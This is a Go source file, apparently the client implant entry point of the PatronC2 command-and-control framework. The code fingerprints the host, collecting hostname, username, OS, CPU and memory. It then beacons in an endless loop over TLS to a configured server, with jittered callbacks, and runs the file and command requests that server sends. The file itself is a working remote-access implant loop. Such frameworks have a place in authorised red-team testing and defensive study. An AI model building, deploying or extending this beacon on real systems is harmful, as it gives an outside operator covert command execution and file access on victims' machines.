package main

import (
	"log"
	"time"

	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
)

func main() {
	client_utils.Initialize(LoggingEnabled)
	config, err := client_utils.LoadCertificate(RootCert)
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		beacon, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
		err = client_utils.HandleConfigurationRequest(
			beacon, agentID, hostname, username, ip,
			osType, osArch, osVersion, cpus, memory,
			ServerIP, ServerPort, CallbackFrequency, CallbackJitter,
			nextCallback,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		sleepDuration := time.Until(nextCallback)

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
		}
	}
}
